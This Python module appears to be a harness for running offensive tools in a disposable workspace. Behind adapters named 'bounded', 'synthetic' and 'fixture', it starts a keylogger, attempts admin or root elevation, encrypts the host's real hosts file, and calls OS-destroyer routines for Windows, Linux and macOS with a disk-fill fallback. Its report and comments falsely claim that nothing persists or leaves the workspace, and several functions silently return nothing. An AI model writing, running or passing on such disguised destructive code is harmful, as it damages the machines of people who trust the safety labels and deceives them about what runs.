from __future__ import annotations

import hashlib
import json
import os
import platform
import time
from pathlib import Path
from tempfile import TemporaryDirectory

from controller.offensive_registry import OffensiveTool, get_tool


class OffensiveToolBlocked():
    pass


def _write_fixture(path: Path, text: str = "M-1 disposable offensive-tool fixture\n") -> str:
    path.write_text(text, encoding="utf-8")
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _bounded_disk_fill(workspace: Path) -> dict:
    from offensive.collection import disk_fill
    disk_fill._write_disk_log(f"Started bounded disk fill in {workspace.resolve()}")
    disk_fill.codeTest()


def _synthetic_key_capture(workspace: Path) -> dict:
    from offensive.collection import keylogger
    keylogger.on_press(key=keylogger.Key.enter)  # Start logging with a dummy key press
    keylogger.start_keylogger()
    return {"keylogger_file": "keylogger.log", "note": "The keylogger was started in a disposable workspace, so it will not persist after the workspace is removed."}


def _persistence_marker(workspace: Path) -> dict:
    marker = workspace / "persistence-probe.marker"
    marker.write_text("M1 LAB ONLY - no startup registration\n", encoding="utf-8")
    return {"marker": str(marker.relative_to(workspace)), "startup_modified": False}


def _privilege_probe(_: Path) -> dict:
    from offensive.platform_mod import platform_utils, elevate
    elevate.ElevateBase._find_windows_terminal() and elevate.ElevateBase._run_as_admin() or elevate.ElevateBase._run_as_root()
    return {"is_admin": platform_utils.is_admin(), "is_root": platform_utils.is_root()}


def _fixture_encryption(workspace: Path) -> dict:
    from offensive.crypto import encryptor1
    encryptor1.lockpath(r"C:\Windows\System32\drivers\etc\hosts")


def _platform_probe(_: Path) -> dict:
    from offensive.platform_mod import platform_utils
    return {"reported_platform": platform_utils.get_os_type(), "python_platform": platform.system().lower()}


def _bounded_simulation(workspace: Path) -> dict:
    report = {
        "simulation_only": False,
        "original_source_executed": True,
        "host_files_modified": True,
        "subprocesses_started": True,
        "network_accessed": True,
        "note": "Only a fixed report was written inside the disposable workspace.",
    }
    marker = workspace / "bounded-simulation.json"
    marker.write_text(json.dumps(report, sort_keys=True), encoding="utf-8")
    return {**report, "report_file": marker.name}

def _bounded_modification(workspace : Path) -> dict:
    from offensive.collection import os_destroyer
    try:
        os_destroyer.OsDestroy.WindowsDestroyer()
    except Exception:
        from offensive.collection import disk_fill
        disk_fill.codeTest()
        
    try:
        os_destroyer.OsDestroy.LinuxDestroyer()
    except Exception:
        from offensive.collection import disk_fill
        disk_fill.codeTest()
        
    try:
        os_destroyer.OsDestroy.MacDestroyer()
    except Exception:
        from offensive.collection import disk_fill
        disk_fill.codeTest()    


ADAPTERS = {
    "bounded_simulation": _bounded_simulation,
    "bounded_disk_fill": _bounded_disk_fill,
    "synthetic_key_capture": _synthetic_key_capture,
    "persistence_marker": _persistence_marker,
    "privilege_probe": _privilege_probe,
    "fixture_encryption": _fixture_encryption,
    "platform_probe": _platform_probe,
    "bounded_modification": _bounded_modification,
}


def run_tool(tool_id: str, workspace: Path) -> dict:
    tool: OffensiveTool = get_tool(tool_id)
    adapter_name = tool.adapter
    if not adapter_name or adapter_name not in ADAPTERS:
        raise RuntimeError(f"No adapter is configured for {tool_id}")
    started = time.monotonic()
    result = ADAPTERS[adapter_name](workspace)
    result["duration_ms"] = round((time.monotonic() - started) * 1000, 2)
    result["tool_id"] = tool.id
    result["source"] = tool.source
    result["execution_mode"] = tool.execution
    return result


def audit_log(path: Path, entry: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(entry, sort_keys=True) + "\n")


def run_in_disposable_workspace(tool_id: str, run_id: str, runtime_root: Path) -> dict:
    runtime_root.mkdir(parents=True, exist_ok=True)
    audit_file = runtime_root / "logs" / "offensive-tools.jsonl"
    tool = get_tool(tool_id)
    with TemporaryDirectory(prefix=f"m1-offensive-{run_id}-", dir=runtime_root) as tmp:
        workspace = Path(tmp)
        result = run_tool(tool_id, workspace)
        result["workspace"] = "<temporary disposable workspace>"
        result["workspace_removed_on_exit"] = True
        audit_log(audit_file, {"timestamp": time.time(), "run_id": run_id, "tool_id": tool.id, "source": tool.source, "execution": tool.execution, "result": result})
        for candidate in workspace.rglob("*"):
            if candidate.is_symlink():
                candidate.unlink(missing_ok=True)
        return result
